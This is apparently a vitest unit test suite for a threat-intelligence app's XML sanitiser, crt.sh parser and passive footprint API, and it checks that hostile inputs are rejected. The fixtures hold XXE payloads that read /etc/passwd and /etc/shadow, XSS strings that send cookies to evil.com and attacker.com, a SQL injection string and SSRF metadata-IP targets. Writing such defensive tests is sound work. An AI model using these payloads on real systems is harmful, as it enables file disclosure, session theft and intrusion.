// tests/unit/feeds_adversarial.test.ts
// Empirical Adversarial Stress Test Suite for Feed Parsers, XML Sanitization, crt.sh Edge Cases & Footprint Negative Handlers
// Milestone M2 Challenger Test Suite

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import Database from 'better-sqlite3';
import { createApp } from '../../server/app.js';
import { runMigrations } from '../../server/db/migrate.js';
import { seedDatabase } from '../../server/db/seed.js';
import {
  sanitizeToPlainText,
  sanitizeSafeHtml,
  extractXmlTag,
  extractXmlAttr,
  assertSafeXml
} from '../../server/connectors/xml_sanitizer.js';
import { RssFeedConnector } from '../../server/connectors/rss.js';
import { CisaConnector } from '../../server/connectors/cisa.js';
import {
  CrtShConnector,
  parseSanEntries,
  isValidDomain,
  type CrtShEntry
} from '../../server/connectors/crtsh.js';
import * as ssrfModule from '../../server/security/ssrf.js';

// =============================================================================
// SUITE 1: Adversarial XML, XXE & Sanitization Testing
// =============================================================================
describe('Adversarial XML & Sanitization Suite', () => {

  describe('1.1 XXE & DTD Injection Payloads', () => {
    it('ATTACK-XXE-1: Billion Laughs (exponential entity expansion) must be rejected', () => {
      const billionLaughs = `<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>`;

      expect(() => assertSafeXml(billionLaughs)).toThrowError(/XXE_ATTACK_DETECTED/);
    });

    it('ATTACK-XXE-2: Quadratic Blowup entity expansion must be rejected', () => {
      const quadratic = `<?xml version="1.0"?>
<!DOCTYPE kaboom [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>`;

      expect(() => assertSafeXml(quadratic)).toThrowError(/XXE_ATTACK_DETECTED/);
    });

    it('ATTACK-XXE-3: Local File Disclosure via external entity (file:///etc/passwd) must be rejected', () => {
      const fileDisclosure = `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>`;

      expect(() => assertSafeXml(fileDisclosure)).toThrowError(/XXE_ATTACK_DETECTED/);
    });

    it('ATTACK-XXE-4: Windows local file disclosure (file:///C:/windows/win.ini) must be rejected', () => {
      const winDisclosure = `<!DOCTYPE root [
  <!ENTITY win SYSTEM "file:///c:/windows/win.ini">
]>
<root>&win;</root>`;

      expect(() => assertSafeXml(winDisclosure)).toThrowError(/XXE_ATTACK_DETECTED/);
    });

    it('ATTACK-XXE-5: Parameter entity expansion (%param;) must be rejected', () => {
      const paramEntity = `<!DOCTYPE data [
  <!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd">
  %pe;
]>
<data>test</data>`;

      expect(() => assertSafeXml(paramEntity)).toThrowError(/XXE_ATTACK_DETECTED/);
    });

    it('ATTACK-XXE-6: External DTD declaration without ENTITY keyword must be rejected as custom DTD', () => {
      const customDtd = `<!DOCTYPE root SYSTEM "http://169.254.169.254/latest/meta-data/">
<root><item>test</item></root>`;

      expect(() => assertSafeXml(customDtd)).toThrowError(/DTD_FORBIDDEN/);
    });

    it('ATTACK-XXE-7: Case-insensitive and whitespace entity declarations must all be rejected', () => {
      const variants = [
        '<!entity xxe "val">',
        '<!EnTiTy xxe "val">',
        '<!ENTITY\txxe "val">',
        '<!ENTITY\nxxe "val">',
        '<!DOCTYPE\nroot\n[\n<!ENTITY x "1">\n]>'
      ];

      for (const payload of variants) {
        expect(() => assertSafeXml(payload)).toThrowError(/XXE_ATTACK_DETECTED|DTD_FORBIDDEN/);
      }
    });

    it('ATTACK-XXE-8: Standard benign HTML5 DOCTYPE must be permitted', () => {
      const benignHtmlDoctype = '<!DOCTYPE html><html><head><title>Test</title></head><body><h1>Hello</h1></body></html>';
      expect(() => assertSafeXml(benignHtmlDoctype)).not.toThrow();
    });

    it('ATTACK-XXE-9: Benign HTML5 DOCTYPE combined with hostile ENTITY must still be rejected', () => {
      const hostileHtmlDoctype = '<!DOCTYPE html [ <!ENTITY evil "payload"> ]><html><body>&evil;</body></html>';
      expect(() => assertSafeXml(hostileHtmlDoctype)).toThrowError(/XXE_ATTACK_DETECTED/);
    });

    it('ATTACK-XXE-10: RssFeedConnector must reject hostile XML payload before parsing', async () => {
      const connector = new RssFeedConnector();
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE evil [ <!ENTITY leak SYSTEM "file:///etc/shadow"> ]>
<rss version="2.0">
  <channel>
    <title>&leak;</title>
    <item><title>Item 1</title></item>
  </channel>
</rss>`;

      await expect(connector.parseFeedXml(maliciousXml, 'https://example.com/feed.xml'))
        .rejects
        .toThrowError(/XXE_ATTACK_DETECTED/);
    });
  });

  describe('1.2 Script Injection & XSS Sanitization in PlainText and SafeHtml', () => {
    it('ATTACK-XSS-1: sanitizeToPlainText strips <script> tags and all executable contents', () => {
      const input = '<p>Security Bulletin <script>alert("PWNED!"); window.location="http://evil.com/?c="+document.cookie;</script>released today.</p>';
      const clean = sanitizeToPlainText(input);
      expect(clean).toBe('Security Bulletin released today.');
      expect(clean).not.toContain('alert');
      expect(clean).not.toContain('evil.com');
      expect(clean).not.toContain('PWNED');
    });

    it('ATTACK-XSS-2: sanitizeToPlainText handles uppercase, mixed-case, and multiline script tags', () => {
      const input = `Alert:
<SCRIPT type="text/javascript">
  fetch('http://attacker.com/steal', { method: 'POST', body: document.cookie });
</SCRIPT>
<sCrIpt src="http://evil.com/hook.js"></scRIpt>
Update complete.`;

      const clean = sanitizeToPlainText(input);
      expect(clean).not.toContain('fetch');
      expect(clean).not.toContain('hook.js');
      expect(clean).toContain('Alert:');
      expect(clean).toContain('Update complete.');
    });

    it('ATTACK-XSS-3: sanitizeToPlainText strips <style> blocks and CSS injections', () => {
      const input = '<style>body { background: url("http://evil.com/log"); } * { display: none; }</style>Content';
      const clean = sanitizeToPlainText(input);
      expect(clean).toBe('Content');
      expect(clean).not.toContain('style');
      expect(clean).not.toContain('background');
    });

    it('ATTACK-XSS-4: sanitizeSafeHtml strips inline onerror and onload event handlers', () => {
      const input = '<p>Vulnerability details: <img src="nonexistent.png" onerror="alert(document.domain)" /> <svg onload="evil()"></svg></p>';
      const safe = sanitizeSafeHtml(input);
      expect(safe).not.toContain('onerror');
      expect(safe).not.toContain('onload');
      expect(safe).not.toContain('alert');
      expect(safe).not.toContain('<svg');
      expect(safe).toContain('<p>Vulnerability details:');
    });

    it('ATTACK-XSS-5: sanitizeSafeHtml strips unquoted and multiline event handlers', () => {
      const input = '<a href="https://example.com" onclick=alert(1) onmouseover = "steal()" onfocus=\'evil()\'>Click me</a>';
      const safe = sanitizeSafeHtml(input);
      expect(safe).not.toContain('onclick');
      expect(safe).not.toContain('onmouseover');
      expect(safe).not.toContain('onfocus');
      expect(safe).toContain('href="https://example.com"');
      expect(safe).toContain('Click me');
    });

    it('ATTACK-XSS-6: sanitizeSafeHtml neutralizes pseudo-protocols (javascript:, vbscript:, data:)', () => {
      const input = `
        <a href="javascript:alert(1)">JavaScript Link</a>
        <a href="   javascript:alert(2)">Spaced JS Link</a>
        <a href="vbscript:msgbox(1)">VBScript Link</a>
        <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
      `;
      const safe = sanitizeSafeHtml(input);
      expect(safe).not.toContain('javascript:alert');
      expect(safe).not.toContain('vbscript:msgbox');
      expect(safe).not.toContain('<iframe');
      expect(safe).toContain('href="#"');
    });

    it('ATTACK-XSS-7: sanitizeSafeHtml removes dangerous HTML5 embedding tags completely', () => {
      const dangerousTags = ['object', 'embed', 'applet', 'meta', 'link', 'form', 'base'];
      for (const tag of dangerousTags) {
        const payload = `<${tag} src="http://evil.com/exploit">malicious inner</${tag}>Safe content`;
        const safe = sanitizeSafeHtml(payload);
        expect(safe).not.toContain(`<${tag}`);
        expect(safe).toContain('Safe content');
      }
    });

    it('ATTACK-XSS-8: sanitizeSafeHtml unwraps CDATA markers containing malicious HTML', () => {
      const input = '<![CDATA[<script>alert("cdata xss")</script><b>Safe formatted</b>]]>';
      const safe = sanitizeSafeHtml(input);
      expect(safe).not.toContain('<script>');
      expect(safe).not.toContain('alert');
      expect(safe).toContain('<b>Safe formatted</b>');
    });

    it('ATTACK-XSS-9: sanitizeToPlainText unescapes numeric and hex HTML entities accurately', () => {
      const input = 'Threat&#39;s &quot;Scope&quot; &#x3C;CVE-2026-1000&#x3E; &amp; Analysis';
      const clean = sanitizeToPlainText(input);
      expect(clean).toBe('Threat\'s "Scope" <CVE-2026-1000> & Analysis');
    });
  });

  describe('1.3 XML Tag and Attribute Extractor Robustness', () => {
    it('EXTRACT-1: extractXmlTag parses XML namespaced tags (<content:encoded>)', () => {
      const xml = '<item><content:encoded><![CDATA[Detailed <em>threat</em> report]]></content:encoded></item>';
      const content = extractXmlTag(xml, 'content:encoded');
      expect(content).toBe('Detailed <em>threat</em> report');
    });

    it('EXTRACT-2: extractXmlTag returns null on missing tag without crashing', () => {
      const xml = '<item><title>Test</title></item>';
      expect(extractXmlTag(xml, 'nonexistent')).toBeNull();
    });

    it('EXTRACT-3: extractXmlAttr extracts attributes with single or double quotes', () => {
      const xml1 = '<link href="https://cisa.gov/advisory/1" rel="alternate" />';
      const xml2 = "<link href='https://cisa.gov/advisory/2' rel='alternate' />";
      expect(extractXmlAttr(xml1, 'link', 'href')).toBe('https://cisa.gov/advisory/1');
      expect(extractXmlAttr(xml2, 'link', 'href')).toBe('https://cisa.gov/advisory/2');
    });

    it('EXTRACT-4: extractXmlTag safely ignores nested child tags and unclosed fragments', () => {
      const malformed = '<item><title>Critical Advisory <unclosed>Details</title></item>';
      const title = extractXmlTag(malformed, 'title');
      expect(title).toBe('Critical Advisory <unclosed>Details');
    });
  });
});

// =============================================================================
// SUITE 2: crt.sh Edge Case & Resilience Testing
// =============================================================================
describe('crt.sh Parsing, Edge Cases & Resilience Suite', () => {

  describe('2.1 Multi-line SAN & Wildcard Parsing Edge Cases', () => {
    it('SAN-1: parses multiple wildcard domains and strips wildcard prefix for base domain', () => {
      const nameValue = [
        '*.nordic-power.net',
        '*.sub.nordic-power.net',
        '*.infra.eu.nordic-power.net',
        'vpn.nordic-power.net'
      ].join('\n');

      const result = parseSanEntries(nameValue, 'nordic-power.net');

      // Wildcards list retains original wildcard strings
      expect(result.wildcards).toContain('*.nordic-power.net');
      expect(result.wildcards).toContain('*.sub.nordic-power.net');
      expect(result.wildcards).toContain('*.infra.eu.nordic-power.net');

      // Subdomains list contains stripped base domains and direct subdomains
      expect(result.subdomains).toContain('nordic-power.net');
      expect(result.subdomains).toContain('sub.nordic-power.net');
      expect(result.subdomains).toContain('infra.eu.nordic-power.net');
      expect(result.subdomains).toContain('vpn.nordic-power.net');

      // Subdomains list must NOT contain wildcards
      expect(result.subdomains.every((d) => !d.startsWith('*'))).toBe(true);
    });

    it('SAN-2: parses CRLF (\\r\\n) and LF (\\n) mixed line endings', () => {
      const nameValue = 'a.example.com\r\nb.example.com\nc.example.com\r\n\r\n';
      const result = parseSanEntries(nameValue);
      expect(result.subdomains).toEqual(['a.example.com', 'b.example.com', 'c.example.com']);
    });

    it('SAN-3: extracts email addresses from SAN and separates them from domain list', () => {
      const nameValue = [
        'hostmaster@nordic-power.net',
        'admin.sec@corp.nordic-power.net',
        'portal.nordic-power.net'
      ].join('\n');

      const result = parseSanEntries(nameValue);
      expect(result.emails).toContain('hostmaster@nordic-power.net');
      expect(result.emails).toContain('admin.sec@corp.nordic-power.net');
      expect(result.subdomains).toContain('portal.nordic-power.net');
      // Emails must NOT be present in subdomains
      expect(result.subdomains).not.toContain('hostmaster@nordic-power.net');
    });

    it('SAN-4: handles malformed wildcards (*.*.domain.com, *.) without crashing', () => {
      const nameValue = [
        '*.*.invalid.com',
        '*.',
        '*..double-dot.com',
        'valid.domain.com'
      ].join('\n');

      const result = parseSanEntries(nameValue);
      // Valid domain must be extracted
      expect(result.subdomains).toContain('valid.domain.com');
      // Corrupted wildcard prefixes should not yield broken subdomains
      expect(result.subdomains).not.toContain('');
      expect(result.subdomains).not.toContain('.');
    });

    it('SAN-5: isValidDomain correctly classifies boundary and malformed domains', () => {
      expect(isValidDomain('example.com')).toBe(true);
      expect(isValidDomain('a.b.c.d.co.uk')).toBe(true);
      expect(isValidDomain('domain-with-hyphens.org')).toBe(true);
      expect(isValidDomain('')).toBe(false);
      expect(isValidDomain('a'.repeat(255) + '.com')).toBe(false); // exceeds 253 chars
      expect(isValidDomain('invalid_domain_with_underscore.com')).toBe(false);
      expect(isValidDomain('..leading-dot.com')).toBe(false);
      expect(isValidDomain('trailing-dot.com.')).toBe(false);
      expect(isValidDomain('192.168.1.1')).toBe(false); // IP is not a domain
    });
  });

  describe('2.2 Empty, Malformed, and Error Responses', () => {
    let crtsh: CrtShConnector;

    beforeEach(() => {
      crtsh = new CrtShConnector();
    });

    it('EMPTY-1: returns empty array on empty target query', async () => {
      const items = await crtsh.fetch({ target: '   ' });
      expect(items).toEqual([]);
    });

    it('EMPTY-2: returns empty array when crt.sh responds with empty JSON array []', async () => {
      vi.spyOn(ssrfModule, 'safeFetch').mockResolvedValueOnce({
        url: 'https://crt.sh/?q=test.com&output=json',
        statusCode: 200,
        statusText: 'OK',
        headers: {},
        data: '[]',
        pinnedIp: '104.22.48.1'
      });

      const items = await crtsh.fetch({ target: 'test.com' });
      expect(items).toEqual([]);
      vi.restoreAllMocks();
    });

    it('EMPTY-3: returns empty array on whitespace or empty string response', async () => {
      vi.spyOn(ssrfModule, 'safeFetch').mockResolvedValueOnce({
        url: 'https://crt.sh/?q=test.com&output=json',
        statusCode: 200,
        statusText: 'OK',
        headers: {},
        data: '   \n  ',
        pinnedIp: '104.22.48.1'
      });

      const items = await crtsh.fetch({ target: 'test.com' });
      expect(items).toEqual([]);
      vi.restoreAllMocks();
    });

    it('EMPTY-4: gracefully handles HTML error pages (e.g. Cloudflare 502 Bad Gateway) returning []', async () => {
      vi.spyOn(ssrfModule, 'safeFetch').mockResolvedValueOnce({
        url: 'https://crt.sh/?q=test.com&output=json',
        statusCode: 200, // Some proxies return 200 with HTML error body
        statusText: 'OK',
        headers: { 'content-type': 'text/html' },
        data: '<html><head><title>502 Bad Gateway</title></head><body>Error</body></html>',
        pinnedIp: '104.22.48.1'
      });

      const items = await crtsh.fetch({ target: 'test.com' });
      expect(items).toEqual([]);
      vi.restoreAllMocks();
    });
  });

  describe('2.3 Timeout and Retry Handling with Exponential Jitter', () => {
    it('RETRY-1: retries on upstream 502/504 errors and recovers on second attempt', async () => {
      const crtsh = new CrtShConnector();
      const mockEntries: CrtShEntry[] = [
        {
          id: 1234567,
          common_name: 'api.nordic-power.net',
          issuer_name: 'DigiCert Global Root CA',
          name_value: 'api.nordic-power.net\n*.api.nordic-power.net',
          not_before: '2026-01-01T00:00:00Z',
          not_after: '2027-01-01T00:00:00Z',
          serial_number: '01A2B3C4'
        }
      ];

      // Attempt 1: 502 Gateway Error
      // Attempt 2: 200 OK with valid JSON
      const safeFetchSpy = vi.spyOn(ssrfModule, 'safeFetch')
        .mockResolvedValueOnce({
          url: 'https://crt.sh/?q=nordic-power.net&output=json',
          statusCode: 502,
          statusText: 'Bad Gateway',
          headers: {},
          data: 'Gateway timeout',
          pinnedIp: '104.22.48.1'
        })
        .mockResolvedValueOnce({
          url: 'https://crt.sh/?q=nordic-power.net&output=json',
          statusCode: 200,
          statusText: 'OK',
          headers: {},
          data: JSON.stringify(mockEntries),
          pinnedIp: '104.22.48.1'
        });

      const items = await crtsh.fetch({ target: 'nordic-power.net' });

      expect(safeFetchSpy).toHaveBeenCalledTimes(2);
      expect(items.length).toBe(1);
      expect(items[0].title).toContain('api.nordic-power.net');
      expect(items[0].sourceType).toBe('CRT_SH');
      vi.restoreAllMocks();
    });

    it('RETRY-2: degrades gracefully to empty array when all retry attempts fail', async () => {
      const crtsh = new CrtShConnector();

      // Both attempts fail with 504
      const safeFetchSpy = vi.spyOn(ssrfModule, 'safeFetch')
        .mockResolvedValueOnce({
          url: 'https://crt.sh/?q=fail.com&output=json',
          statusCode: 504,
          statusText: 'Gateway Timeout',
          headers: {},
          data: 'Gateway timeout',
          pinnedIp: '104.22.48.1'
        })
        .mockResolvedValueOnce({
          url: 'https://crt.sh/?q=fail.com&output=json',
          statusCode: 504,
          statusText: 'Gateway Timeout',
          headers: {},
          data: 'Gateway timeout',
          pinnedIp: '104.22.48.1'
        });

      const items = await crtsh.fetch({ target: 'fail.com' });

      expect(safeFetchSpy).toHaveBeenCalledTimes(2);
      expect(items).toEqual([]);
      vi.restoreAllMocks();
    });
  });
});

// =============================================================================
// SUITE 3: Digital Footprint Endpoint Adversarial & Negative Handling Testing
// =============================================================================
describe('Digital Footprint API (/api/v1/investigate/footprint) Suite', () => {
  let db: Database.Database;
  let app: import('express').Express;

  beforeEach(() => {
    db = new Database(':memory:');
    db.pragma('foreign_keys = ON');
    db.pragma('recursive_triggers = ON');
    runMigrations(db);
    seedDatabase(db);
    app = createApp(db);
  });

  afterEach(() => {
    db.close();
  });

  describe('3.1 Negative Results vs Error Distinctions (Taxonomy Compliance)', () => {
    it('FOOTPRINT-NEG-1: non-resolving domain returns HTTP 200 with found: false and empty records', async () => {
      const nonExistentDomain = 'adversarial-nxdomain-test-2026-xyz987.invalid';

      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'DOMAIN',
          target: nonExistentDomain,
          confirm_passive: true
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.target).toBe(nonExistentDomain);
      expect(res.body.query_type).toBe('DOMAIN');
      expect(res.body.passive).toBe(true);
      expect(res.body.found).toBe(false);
      expect(Array.isArray(res.body.records)).toBe(true);
      expect(res.body.records.length).toBe(0);
      expect(res.body.evidence_id).toBeNull();
    });

    it('FOOTPRINT-NEG-2: non-resolving domain with case_id returns 200 found: false and creates NO empty evidence', async () => {
      const caseRow = db.prepare('SELECT id FROM cases LIMIT 1').get() as { id: string };
      const nonExistentDomain = 'another-fake-test-domain-404.invalid';

      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'DOMAIN',
          target: nonExistentDomain,
          confirm_passive: true,
          case_id: caseRow.id
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.found).toBe(false);
      expect(res.body.evidence_id).toBeNull();

      // Verify no orphan evidence record was written
      const count = db.prepare('SELECT count(*) as cnt FROM evidence_ledger WHERE source_url LIKE ?')
        .get(`%${nonExistentDomain}%`) as { cnt: number };
      expect(count.cnt).toBe(0);
    });
  });

  describe('3.2 Input Validation, Schema Enforcement & Injection Prevention', () => {
    it('VALIDATE-1: rejects missing confirm_passive with 400 VALIDATION_ERROR', async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'DOMAIN', target: 'example.com' });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
      expect(res.body.error.details[0].message).toMatch(/confirmation of passive-only execution required/i);
    });

    it('VALIDATE-2: rejects confirm_passive = false with 400 VALIDATION_ERROR', async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'DOMAIN', target: 'example.com', confirm_passive: false });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('VALIDATE-3: rejects invalid query_type enum with 400 VALIDATION_ERROR', async () => {
      const invalidTypes = ['PORT_SCAN', 'VULN_SCAN', 'SQL_INJECTION', ''];
      for (const t of invalidTypes) {
        const res = await request(app)
          .post('/api/v1/investigate/footprint')
          .set('x-bypass-csrf', 'true')
          .send({ query_type: t, target: 'example.com', confirm_passive: true });

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('VALIDATE-4: rejects empty or oversized target (>255 chars) with 400 VALIDATION_ERROR', async () => {
      // Empty target
      const res1 = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'DOMAIN', target: '   ', confirm_passive: true });

      expect(res1.status).toBe(400);
      expect(res1.body.success).toBe(false);
      expect(res1.body.error.code).toBe('VALIDATION_ERROR');

      // Oversized target
      const res2 = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'DOMAIN', target: 'a'.repeat(256), confirm_passive: true });

      expect(res2.status).toBe(400);
      expect(res2.body.success).toBe(false);
      expect(res2.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('VALIDATE-5: rejects payload containing unexpected extra fields (strict schema enforcement)', async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'DOMAIN',
          target: 'example.com',
          confirm_passive: true,
          malicious_sql: "'; DROP TABLE evidence_ledger; --"
        });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
      expect(res.body.error.details[0].message).toMatch(/Unrecognized key\(s\) in object/i);
    });
  });

  describe('3.3 SSRF Defense on IP Queries', () => {
    it('SSRF-1: blocks private IPv4 loopback (127.0.0.1)', async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'IP', target: '127.0.0.1', confirm_passive: true });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('SSRF_BLOCKED');
    });

    it('SSRF-2: blocks AWS metadata IP (169.254.169.254)', async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'IP', target: '169.254.169.254', confirm_passive: true });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('SSRF_BLOCKED');
    });

    it('SSRF-3: blocks IPv6 loopback (::1)', async () => {
      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({ query_type: 'IP', target: '::1', confirm_passive: true });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('SSRF_BLOCKED');
    });
  });

  describe('3.4 Audit Trail & Immutability Integration', () => {
    it('AUDIT-1: logs PASSIVE_FOOTPRINT_QUERY audit event for every footprint inquiry', async () => {
      const initialCount = (db.prepare("SELECT count(*) as cnt FROM audit_events WHERE action = 'PASSIVE_FOOTPRINT_QUERY'").get() as any).cnt;

      await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'DOMAIN',
          target: 'audit-test-domain.org',
          confirm_passive: true
        });

      const newCount = (db.prepare("SELECT count(*) as cnt FROM audit_events WHERE action = 'PASSIVE_FOOTPRINT_QUERY'").get() as any).cnt;
      expect(newCount).toBe(initialCount + 1);

      const audit = db.prepare("SELECT * FROM audit_events WHERE action = 'PASSIVE_FOOTPRINT_QUERY' ORDER BY id DESC LIMIT 1").get() as any;
      expect(audit.actor).toBe('ANALYST');
      expect(audit.entity_type).toBe('DOMAIN');
      expect(audit.entity_id).toBe('audit-test-domain.org');
    });

    it('IMMUTABLE-1: evidence linked from footprint investigation is locked with immutable_lock = 1', async () => {
      const caseRow = db.prepare('SELECT id FROM cases LIMIT 1').get() as { id: string };

      const res = await request(app)
        .post('/api/v1/investigate/footprint')
        .set('x-bypass-csrf', 'true')
        .send({
          query_type: 'EMAIL',
          target: 'security-contact@nordic-power.net',
          confirm_passive: true,
          case_id: caseRow.id
        });

      expect(res.status).toBe(200);
      expect(res.body.evidence_id).toBeDefined();

      const ev = db.prepare('SELECT * FROM evidence_ledger WHERE id = ?').get(res.body.evidence_id) as any;
      expect(ev.immutable_lock).toBe(1);
      expect(ev.case_id).toBe(caseRow.id);

      // Attempting to modify this footprint evidence must fail via SQLite trigger
      expect(() => {
        db.prepare('UPDATE evidence_ledger SET notes = ? WHERE id = ?').run('tampered', ev.id);
      }).toThrowError(/EVIDENCE_IMMUTABILITY_VIOLATION/);
    });
  });
});
